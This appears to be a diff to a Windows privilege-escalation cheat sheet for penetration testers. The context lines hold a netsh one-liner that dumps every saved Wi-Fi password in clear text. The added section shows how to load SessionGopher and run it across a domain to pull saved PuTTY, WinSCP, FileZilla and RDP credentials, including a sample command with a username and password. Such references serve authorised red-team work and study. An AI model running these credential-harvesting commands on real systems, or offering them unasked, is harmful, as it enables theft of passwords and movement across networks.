@@ -320,6 +320,19 @@ Oneliner method to extract wifi passwords from all the access point.
 cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
 ```
 
+### Passwords stored in services
+
+Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using [SessionGopher](https://github.com/Arvanaghi/SessionGopher)
+
+
+```powershell
+https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
+Import-Module path\to\SessionGopher.ps1;
+Invoke-SessionGopher -AllDomain -o
+Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
+```
+
+
 ## EoP - Processes Enumeration and Tasks
 
 What processes are running?
